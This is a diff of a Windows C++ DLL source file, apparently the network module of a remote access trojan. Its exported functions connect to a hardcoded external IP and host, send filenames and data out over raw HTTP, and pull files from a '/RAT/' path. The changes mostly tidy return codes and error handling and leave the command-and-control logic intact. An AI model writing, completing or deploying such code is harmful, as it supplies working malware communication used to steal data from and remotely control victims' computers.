@@ -1,38 +1,32 @@
 //cl /EHsc /LD .\network_lib.cpp /link User32.lib
-#include <winsock2.h>
 #include <iostream>
 #include <ws2tcpip.h>
 #include <Windows.h>
 #include <string>
-#include <thread>
 #include <sstream>                                                              // Include for stringstream
 #include <mutex>
-#include <fstream>
 
 #pragma comment(lib, "ws2_32.lib")
 using namespace std;
-
-#ifdef _WIN32
 #define DLL_EXPORT __declspec(dllexport)
-#else
-#define DLL_EXPORT 
-#endif
 
 SOCKET clientSocket;
 std::mutex socketMutex; 
 
-void safe_closesocket(SOCKET &clientSocket)
+int safe_closesocket(SOCKET &clientSocket)
 {
     if (clientSocket != INVALID_SOCKET)
     {
         shutdown(clientSocket, SD_BOTH);
         closesocket(clientSocket);
-        
+
         clientSocket = INVALID_SOCKET;
+        return 0;
     }
+    else return 1;
 }
 
-bool socket_setup(SOCKET &clientSocket)
+int socket_setup(SOCKET &clientSocket)
 {
     bool connected = false;
 
@@ -40,7 +34,7 @@ bool socket_setup(SOCKET &clientSocket)
     if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
     {
         std::cerr << "WSAStartup failed.\n";
-        return 1;
+        return 0;
     }
 
     clientSocket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
@@ -48,16 +42,14 @@ bool socket_setup(SOCKET &clientSocket)
     {
         std::cerr << "socket failed.\n";
         WSACleanup();
-        return 1;
+        return 0;
     }
 
     sockaddr_in serverAddr;
     serverAddr.sin_family = AF_INET;
-    
     serverAddr.sin_port = htons(80);
     serverAddr.sin_addr.s_addr = inet_addr("103.92.235.21");
 
-    connected = false;
     while (!connected)
     {
         if (connect(clientSocket, (sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
@@ -75,15 +67,15 @@ bool socket_setup(SOCKET &clientSocket)
         else connected = true;
 
     }
-    return true;
+    return 1;
 }
 
-DLL_EXPORT void send_data(const string& filename , const string& data)
+DLL_EXPORT int send_data(const string& filename , const string& data)
 {
     {
         lock_guard<mutex> lock1(socketMutex); 
         
-        socket_setup(clientSocket);
+        if(!socket_setup(clientSocket)) return 1;
 
         string strfilename="",strdata="",httpRequest = "";;
         strfilename = filename.c_str();
@@ -102,6 +94,7 @@ DLL_EXPORT void send_data(const string& filename , const string& data)
         {
             int error = WSAGetLastError();
             cerr << "Send failed with error: " << error << " (" << gai_strerror(error) << ")" << endl;
+            return 1;
         }
 
         ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
@@ -133,26 +126,22 @@ DLL_EXPORT void send_data(const string& filename , const string& data)
 
         ////////////////////////////////////////////to get response///////////////////////////////////////////////////////////////////////////////////////
 
-        safe_closesocket(clientSocket);
-        //MessageBoxA(NULL, "socket closed" , "!!!!!!!!", MB_OK | MB_ICONINFORMATION);
-
-        return;
+        if(!safe_closesocket(clientSocket)) return 1;
+        return 0;
     }
-
 }
 
-DLL_EXPORT string receive_data(SOCKET &clientSocket, const string &filename)
+DLL_EXPORT string receive_data(const string &filename)
 {
     {
         lock_guard<mutex> lock1(socketMutex);
 
         socket_setup(clientSocket);
 
-        string httpRequest = "GET /RAT/"+filename+" HTTP/1.1\r\n";
+        string f_name = filename.c_str();
+        string httpRequest = "GET /RAT/"+f_name+" HTTP/1.1\r\n";
         httpRequest += "Host: arth.imbeddex.com\r\n";
         httpRequest += "Connection: close\r\n\r\n";
-
-        //cout<< httpRequest<<endl;
 
         int bytesSent = send(clientSocket, httpRequest.c_str(), httpRequest.length(), 0);
         if (bytesSent == SOCKET_ERROR)
@@ -187,12 +176,12 @@ DLL_EXPORT string receive_data(SOCKET &clientSocket, const string &filename)
             }
         } while (bytesReceived == sizeof(buffer) - 1); // Continue if buffer was full
 
-
         ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
 
         // Robust HTTP response parsing
         size_t headerEnd = receivedData.find("\r\n\r\n");
-        if (headerEnd == string::npos) {
+        if (headerEnd == string::npos)
+        {
             cerr << "Invalid HTTP receivedData: No header/body separator found." << endl;
             return "";
         }
@@ -226,20 +215,12 @@ DLL_EXPORT string receive_data(SOCKET &clientSocket, const string &filename)
             }
             body = unchunkedBody;
         }
+
         safe_closesocket(clientSocket);
-
-        //send_data(clientSocket, "from_server.txt", "`");
         return body;
-
     }
 }
 
-DLL_EXPORT void sayhi(const string& message)
-{
-    MessageBoxA(NULL, message.c_str(), "socket setup", MB_OK | MB_ICONINFORMATION);
-}
-
-// DLL entry point
 BOOL APIENTRY DllMain(HINSTANCE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
     switch (ul_reason_for_call)
     {
